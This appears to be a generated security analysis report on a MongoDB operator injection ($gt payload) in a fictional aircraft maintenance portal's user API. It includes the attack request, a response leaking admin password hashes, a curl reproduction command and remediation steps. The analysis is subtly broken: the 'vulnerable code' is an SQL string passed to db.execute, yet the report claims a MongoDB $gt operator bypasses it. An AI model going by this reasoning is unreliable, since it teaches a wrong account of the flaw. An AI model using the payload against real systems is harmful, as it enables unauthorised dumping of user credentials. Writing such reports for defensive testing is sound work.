# Security Analysis Report
**System:** WingTech Maintenance Portal
**Domain:** Aerospace / MRO
**Example ID:** INJ-0026
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | NoSQL Injection | MongoDB operator injection via `query` parameter on `/api/v1/users` — attacker injects `{"$gt": ""}` to bypass query filter and dump all user records including admin credentials |

---

## Finding 1 — NoSQL Injection: MongoDB Operator Injection

### Summary
The `/api/v1/users` endpoint on WingTech Maintenance Portal (`api.wingtech-mainte.example.com`) constructs a MongoDB query using raw string concatenation (`${req.query.query}`). Per §3.0 and §4.0, the older endpoint was missed during the parameterization migration and remains vulnerable. An attacker injects a MongoDB comparison operator (`{"$gt": ""}`) into the `query` parameter — this replaces the literal equality check with a MongoDB `$gt` (greater than) operator, bypassing authentication/filter logic and returning all user records including admin credentials and password hashes.

**Pattern:** NoSQL Injection (MongoDB operator injection)
**Affected endpoint:** `GET https://api.wingtech-mainte.example.com/api/v1/users`
**Vulnerable parameter:** `query`

### Evidence from HAR (§5.0)

**Request — Attack**
```
GET https://api.wingtech-mainte.example.com/api/v1/users?query={%20"$gt":%20""%20}
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Accept: application/json
```

**Injected payload:** `query={ "$gt": "" }` (URL-decoded)

**Response — All User Records Returned (authentication bypass)**
```json
{
  "data": [
    {"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"},
    {"id": 2, "username": "user2", "password_hash": "$2b$12$abc"}
  ]
}
```
Admin credentials disclosed: `username: admin`, `password_hash: $2b$12$secret`, `role: ADMIN`. Full user table dump confirms MongoDB operator injection succeeded.

**Vulnerable code (§3.0):**
```javascript
const query = `SELECT * FROM users WHERE query = '${req.query.query}'`;
db.execute(query, (err, results) => { ... });
```
The `$gt` MongoDB operator, when injected, causes the filter condition to match all documents (any value is `> ""`).

### Steps to Reproduce
```bash
curl -s -G "https://api.wingtech-mainte.example.com/api/v1/users" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Accept: application/json" \
  --data-urlencode 'query={ "$gt": "" }'
# Vulnerable: all user records returned including admin credentials
# Secure: {"data": [], "error": "Invalid query parameter"}
```

### Remediation
1. Use parameterized queries / ORM with bound parameters — never string concatenation.
2. Validate and sanitize `query` parameter — reject MongoDB operator syntax (`$`-prefixed keys).
3. Remove over-privileged DB account (`db_owner`) — use least-privilege DB role.
4. Deploy WAF with NoSQLi detection rules on legacy endpoints.
